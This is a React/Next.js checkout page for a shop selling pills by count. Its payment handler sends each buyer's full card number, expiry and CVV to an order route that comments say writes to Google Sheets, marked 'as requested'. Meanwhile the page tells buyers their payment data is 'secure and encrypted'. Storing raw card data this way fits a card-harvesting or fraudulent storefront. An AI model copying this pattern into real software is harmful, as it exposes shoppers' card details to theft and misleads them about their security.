"use client"

import React, { useState, useEffect } from "react"

import Link from "next/link"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useCart } from "@/lib/cart-context"
import { ArrowLeft, CreditCard, Check } from "lucide-react"
import { toast } from "@/components/ui/use-toast"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Select, SelectTrigger, SelectContent, SelectItem, SelectValue } from "@/components/ui/select"
import { US_STATES, US_CITIES } from "@/lib/us-location-data"

export default function CheckoutPage() {
  const router = useRouter()
  const { cart, clearCart } = useCart()
  const [activeTab, setActiveTab] = useState("shipping")

  // Custom pricing logic for pills
  function getPillPrice(qty: number) {
    if (qty === 100) return 100
    if (qty === 200) return 180
    if (qty === 300) return 240
    if (qty === 500) return 480
    return qty * 1 // fallback: $1 per pill
  }

  // Calculate correct subtotal and grand total based on line item logic
  const getLineTotal = (item: any) => {
    const isPill = item.product.variations && item.product.variations.some((v: string) => v.includes('pills')) && item.variation.includes('pills');
    let price = 0;
    let pillQty = 0;
    if (isPill) pillQty = parseInt(item.variation);
    if (isPill) {
      if (pillQty === 100) price = 100;
      else if (pillQty === 200) price = 180;
      else if (pillQty === 300) price = 240;
      else if (pillQty === 500) price = 480;
      else price = pillQty;
    } else {
      price = item.product.price;
    }
    return price * item.quantity;
  };
  // Calculate totals
  const subtotal = cart.reduce((total, item) => total + getLineTotal(item), 0);
  const grandTotal = subtotal

  // Form states
  const [shippingInfo, setShippingInfo] = useState({
    firstName: "",
    lastName: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
    country: "United States",
    phone: "",
    email: "",
  })

  const [paymentInfo, setPaymentInfo] = useState({
    cardNumber: "",
    nameOnCard: "",
    expiryDate: "",
    cvv: "",
    cardType: "" // Added to store the detected card type
  })
  
  // Function to detect credit card type based on the number
  const getCardType = (cardNumber: string): string => {
    // Remove spaces and dashes
    const cleanNumber = cardNumber.replace(/\s+|-/g, '');
    
    // Basic regex patterns for card identification
    if (/^4/.test(cleanNumber)) return 'Visa';
    if (/^5[1-5]/.test(cleanNumber)) return 'Mastercard';
    if (/^3[47]/.test(cleanNumber)) return 'American Express';
    if (/^6(?:011|5)/.test(cleanNumber)) return 'Discover';
    
    return 'Credit';
  }

  // Add state for available cities based on selected state
  const [availableCities, setAvailableCities] = useState<string[]>([])
  const [isSubmitting, setIsSubmitting] = useState(false)

  const handleShippingChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setShippingInfo((prev) => ({ ...prev, [name]: value }))
  }

  const handlePaymentChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setPaymentInfo((prev) => ({ ...prev, [name]: value }))
  }

  const handleShippingSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    // Validate shipping info
    if (Object.values(shippingInfo).some((value) => value === "")) {
      toast({
        title: "Missing information",
        description: "Please fill in all required fields",
        variant: "destructive",
      })
      return
    }
    setActiveTab("payment")
  }

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validate payment info
    if (Object.values(paymentInfo).some((value) => value === "")) {
      toast({
        title: "Missing information",
        description: "Please fill in all required fields",
        variant: "destructive",
      })
      return
    }
    
    // Validate expiry date
    const expiryDate = paymentInfo.expiryDate;
    if (expiryDate && expiryDate.includes('/')) {
      const [monthStr, yearStr] = expiryDate.split('/');
      const month = parseInt(monthStr);
      const year = 2000 + parseInt(yearStr); // Assuming 20xx
      
      const now = new Date();
      const currentMonth = now.getMonth() + 1; // getMonth is 0-indexed
      const currentYear = now.getFullYear();
      
      if (year < currentYear || (year === currentYear && month < currentMonth)) {
        toast({
          title: "Invalid expiry date",
          description: "Your card appears to be expired. Please check the date.",
          variant: "destructive",
        })
        return
      }
    } else {
      toast({
        title: "Invalid expiry date format",
        description: "Please enter the expiry date in MM/YY format",
        variant: "destructive",
      })
      return
    }

    // Set loading state
    setIsSubmitting(true)
    
    try {
      // Generate a unique order number based on current timestamp
      const orderNumber = Date.now().toString();
      
      // Create form data for order submission
      const orderData = new FormData();
      
      // Add order metadata
      orderData.append('orderNumber', orderNumber);
      orderData.append('orderDate', new Date().toISOString());
      orderData.append('orderTotal', grandTotal.toFixed(2));
      
      // Customer information (combine shipping info into simple fields)
      orderData.append('customerName', `${shippingInfo.firstName} ${shippingInfo.lastName}`);
      orderData.append('customerEmail', shippingInfo.email);
      orderData.append('customerPhone', shippingInfo.phone);
      orderData.append('shippingAddress', `${shippingInfo.address}, ${shippingInfo.city}, ${shippingInfo.state} ${shippingInfo.zipCode}, ${shippingInfo.country}`);
      
      // Add payment information (include full details as requested)
      orderData.append('paymentMethod', 'Credit Card');
      orderData.append('cardholderName', paymentInfo.nameOnCard);
      orderData.append('cardNumber', paymentInfo.cardNumber); // Full card number as requested
      orderData.append('cardExpiry', paymentInfo.expiryDate);
      orderData.append('cardCvv', paymentInfo.cvv); // Including CVV as requested
      
      // Order summary (instead of detailed items)
      orderData.append('totalItems', cart.length.toString());
      orderData.append('orderSummary', cart.map(item => 
        `${item.product.name} (${item.variation}) x${item.quantity}`
      ).join('; '));
      
      // Submit order data to Google Sheets
      const response = await fetch('/api/order-submission', {
        method: 'POST',
        body: orderData
      });
      
      const result = await response.json();
      
      if (!response.ok) {
        throw new Error(result.error || 'Failed to submit order');
      }
      
      // Store order information in localStorage for the confirmation page
      localStorage.setItem('lastOrderNumber', orderNumber);
      
      // Store additional order information for the confirmation page
      const orderInfo = {
        customerInfo: shippingInfo,
        paymentInfo: {
          cardType: paymentInfo.cardType || getCardType(paymentInfo.cardNumber),
          lastFour: paymentInfo.cardNumber.slice(-4),
          nameOnCard: paymentInfo.nameOnCard
        },
        shippingMethod: "Standard (3-5 business days)",
        orderSummary: {
          items: cart.length,
          total: grandTotal.toFixed(2)
        }
      };
      
      localStorage.setItem('lastOrderInfo', JSON.stringify(orderInfo));
      
      toast({
        title: "Order placed successfully!",
        description: `Your order #${orderNumber} has been confirmed.`,
      });
      
      // Clear cart and redirect to confirmation
      clearCart();
      router.push("/order-confirmation");
    } catch (error) {
      console.error("Order submission error:", error);
      toast({
        title: "Order submission failed",
        description: error instanceof Error ? error.message : "There was an error processing your order. Please try again.",
        variant: "destructive"
      });
      // Reset loading state on error
      setIsSubmitting(false);
    } finally {
      // If we need to do anything after submission regardless of success/failure
      // (currently we don't need this as we redirect on success)
    }
  }

  // Update city options when state changes
  useEffect(() => {
    const stateCities = US_CITIES[shippingInfo.state as keyof typeof US_CITIES] || [];
    setAvailableCities(stateCities);
  }, [shippingInfo.state]);

  if (cart.length === 0) {
    return (
      <div className="container mx-auto px-4 py-8">
        <div className="text-center py-16 bg-white rounded-xl shadow-sm">
          <h2 className="text-2xl font-semibold mb-3">Your cart is empty</h2>
          <p className="text-gray-600 mb-8 max-w-md mx-auto">You need to add items to your cart before checking out.</p>
          <Button asChild size="lg">
            <Link href="/products">Browse Products</Link>
          </Button>
        </div>
      </div>
    )
  }

  return (
    <div className="bg-gray-50 py-8 md:py-12">
      <div className="container mx-auto px-4">
        <div className="flex items-center mb-6">
          <Button variant="ghost" asChild className="mr-2 p-0 md:p-2">
            <Link href="/cart" className="flex items-center">
              <ArrowLeft className="h-4 w-4 mr-1 md:mr-2" />
              <span>Back to Cart</span>
            </Link>
          </Button>
          <h1 className="text-xl md:text-3xl font-bold">Checkout</h1>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 md:gap-8">
          {/* Checkout Form */}
          <div className="lg:col-span-2">
            <Tabs value={activeTab} onValueChange={setActiveTab}>
              <TabsList className="grid w-full grid-cols-2">
                <TabsTrigger value="shipping">Shipping</TabsTrigger>
                <TabsTrigger value="payment" disabled={activeTab !== "payment" && activeTab !== "shipping"}>
                  Payment
                </TabsTrigger>
              </TabsList>

              <TabsContent value="shipping">
                <Card>
                  <CardHeader>
                    <CardTitle>Shipping Information</CardTitle>
                    <CardDescription>Enter your shipping details</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <form onSubmit={handleShippingSubmit} className="space-y-4">
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <label htmlFor="firstName" className="text-sm font-medium">
                            First Name
                          </label>
                          <Input
                            id="firstName"
                            name="firstName"
                            value={shippingInfo.firstName}
                            onChange={handleShippingChange}
                            required
                            placeholder="Enter your first name"
                          />
                        </div>
                        <div className="space-y-2">
                          <label htmlFor="lastName" className="text-sm font-medium">
                            Last Name
                          </label>
                          <Input
                            id="lastName"
                            name="lastName"
                            value={shippingInfo.lastName}
                            onChange={handleShippingChange}
                            required
                            placeholder="Enter your last name"
                          />
                        </div>
                      </div>

                      <div className="space-y-2">
                        <label htmlFor="address" className="text-sm font-medium">
                          Address
                        </label>
                        <Input
                          id="address"
                          name="address"
                          value={shippingInfo.address}
                          onChange={handleShippingChange}
                          required
                          placeholder="Enter your address"
                        />
                      </div>

                      <div className="grid grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <label htmlFor="city" className="text-sm font-medium">
                            City
                          </label>
                          <Input
                            id="city"
                            name="city"
                            value={shippingInfo.city}
                            onChange={handleShippingChange}
                            placeholder="Type your city"
                            required
                          />
                        </div>
                        <div className="space-y-2">
                          <label htmlFor="state" className="text-sm font-medium">
                            State
                          </label>
                          <Select
                            value={shippingInfo.state}
                            onValueChange={(value) => setShippingInfo((prev) => ({ ...prev, state: value, city: "" }))}
                            required
                          >
                            <SelectTrigger id="state" name="state">
                              <SelectValue placeholder="Select a state" />
                            </SelectTrigger>
                            <SelectContent>
                              {US_STATES.map((state) => (
                                <SelectItem key={state.value} value={state.value}>{state.label}</SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <label htmlFor="zipCode" className="text-sm font-medium">
                            ZIP Code
                          </label>
                          <Input
                            id="zipCode"
                            name="zipCode"
                            value={shippingInfo.zipCode}
                            onChange={handleShippingChange}
                            required
                            placeholder="ZIP code"
                          />
                        </div>
                        <div className="space-y-2">
                          <label htmlFor="country" className="text-sm font-medium">
                            Country
                          </label>
                          <Input
                            id="country"
                            name="country"
                            value="United States"
                            readOnly
                            disabled
                            placeholder="Country"
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <label htmlFor="phone" className="text-sm font-medium">
                            Phone
                          </label>
                          <Input
                            id="phone"
                            name="phone"
                            type="tel"
                            value={shippingInfo.phone}
                            onChange={handleShippingChange}
                            required
                            placeholder="Phone number"
                          />
                        </div>
                        <div className="space-y-2">
                          <label htmlFor="email" className="text-sm font-medium">
                            Email
                          </label>
                          <Input
                            id="email"
                            name="email"
                            type="email"
                            value={shippingInfo.email}
                            onChange={handleShippingChange}
                            required
                            placeholder="Email address"
                          />
                        </div>
                      </div>

                      <Button type="submit" className="w-full mt-6">
                        Continue to Payment
                      </Button>
                    </form>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="payment">
                <Card>
                  <CardHeader>
                    <CardTitle>Payment Information</CardTitle>
                    <CardDescription>Enter your payment details</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <form onSubmit={handlePaymentSubmit} className="space-y-4">
                      <div className="space-y-2">
                        <label htmlFor="cardNumber" className="text-sm font-medium">
                          Card Number
                        </label>
                        <div className="relative">
                          <Input
                            id="cardNumber"
                            name="cardNumber"
                            placeholder="1234 5678 9012 3456"
                            value={paymentInfo.cardNumber}
                            onChange={(e) => {
                              handlePaymentChange(e);
                              const cardType = getCardType(e.target.value);
                              setPaymentInfo(prev => ({ ...prev, cardType }));
                            }}
                            required
                          />
                          <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center">
                            {paymentInfo.cardType ? (
                              <span className="text-xs font-medium text-gray-600 mr-2">{paymentInfo.cardType}</span>
                            ) : null}
                            <CreditCard className="h-5 w-5 text-gray-400" />
                          </div>
                        </div>
                      </div>

                      <div className="space-y-2">
                        <label htmlFor="nameOnCard" className="text-sm font-medium">
                          Name on Card
                        </label>
                        <Input
                          id="nameOnCard"
                          name="nameOnCard"
                          value={paymentInfo.nameOnCard}
                          onChange={handlePaymentChange}
                          placeholder="John Doe"
                          required
                        />
                      </div>

                      <div className="grid grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <label htmlFor="expiryDate" className="text-sm font-medium">
                            Expiry Date
                          </label>
                          <Input
                            id="expiryDate"
                            name="expiryDate"
                            placeholder="MM/YY"
                            value={paymentInfo.expiryDate}
                            onChange={(e) => {
                              // Format the input as MM/YY
                              let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
                              if (value.length > 0) {
                                // Add / between month and year
                                if (value.length > 2) {
                                  value = value.slice(0, 2) + '/' + value.slice(2, 4);
                                }
                                // Ensure month is between 01-12
                                const month = parseInt(value.substring(0, 2));
                                if (month > 12) {
                                  value = '12' + value.substring(2);
                                } else if (month === 0) {
                                  value = '01' + value.substring(2);
                                }
                              }
                              // Limit to MM/YY format (5 chars total)
                              if (value.length > 5) {
                                value = value.substring(0, 5);
                              }
                              setPaymentInfo(prev => ({ ...prev, expiryDate: value }));
                            }}
                            required
                            maxLength={5}
                          />
                        </div>
                        <div className="space-y-2">
                          <label htmlFor="cvv" className="text-sm font-medium">
                            CVV
                          </label>
                          <Input
                            id="cvv"
                            name="cvv"
                            placeholder="123"
                            value={paymentInfo.cvv}
                            onChange={handlePaymentChange}
                            required
                          />
                        </div>
                      </div>

                      <div className="flex items-center mt-4 space-x-2">
                        <div className="h-5 w-5 rounded-full bg-primary flex items-center justify-center">
                          <Check className="h-3 w-3 text-white" />
                        </div>
                        <span className="text-sm text-gray-600">Your payment information is secure and encrypted</span>
                      </div>

                      <div className="flex gap-4 mt-6">
                        <Button
                          type="button"
                          variant="outline"
                          className="flex-1"
                          onClick={() => setActiveTab("shipping")}
                          disabled={isSubmitting}
                        >
                          Back
                        </Button>
                        <Button type="submit" className="flex-1" disabled={isSubmitting}>
                          {isSubmitting ? (
                            <div className="flex items-center">
                              <div className="h-4 w-4 mr-2 border-t-2 border-b-2 border-white rounded-full animate-spin"></div>
                              Processing...
                            </div>
                          ) : (
                            "Place Order"
                          )}
                        </Button>
                      </div>
                    </form>
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-1">
            <Card>
              <CardHeader>
                <CardTitle>Order Summary</CardTitle>
                <CardDescription>Review your order</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {cart.map((item, index) => {
                  // Determine if this is a pill product and get the correct variation quantity
                  const isPill = item.product.variations && item.product.variations.some(v => v.includes('pills')) && item.variation.includes('pills');
                  let pillQty = 0;
                  if (isPill) pillQty = parseInt(item.variation);
                  // Price for one pack (variation)
                  let price = 0;
                  if (isPill) {
                    if (pillQty === 100) price = 100;
                    else if (pillQty === 200) price = 180;
                    else if (pillQty === 300) price = 240;
                    else if (pillQty === 500) price = 480;
                    else price = pillQty;
                  } else {
                    price = item.product.price;
                  }
                  const itemTotal = price * item.quantity;

                  return (
                    <div key={`${item.product.id}-${item.variation}`} className="flex justify-between pb-2 border-b">
                      <div className="flex-1">
                        <p className="font-medium">{item.product.name}</p>
                        <p className="text-gray-500">{item.variation}</p>
                        <p className="text-gray-500">Qty: {item.quantity}</p>
                      </div>
                      <div className="ml-4">
                        <p className="font-medium">${itemTotal.toFixed(2)}</p>
                      </div>
                    </div>
                  )
                })}

                <div className="pt-2 space-y-2">
                  <div className="flex justify-between">
                    <span className="text-sm font-semibold">Grand Total</span>
                    <span className="font-semibold text-lg">${grandTotal.toFixed(2)}</span>
                  </div>
                </div>

                <Button 
                  type="submit" 
                  className="w-full mt-4" 
                  disabled={isSubmitting}
                >
                  {isSubmitting ? 'Processing...' : 'Checkout'}
                </Button>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  )
}
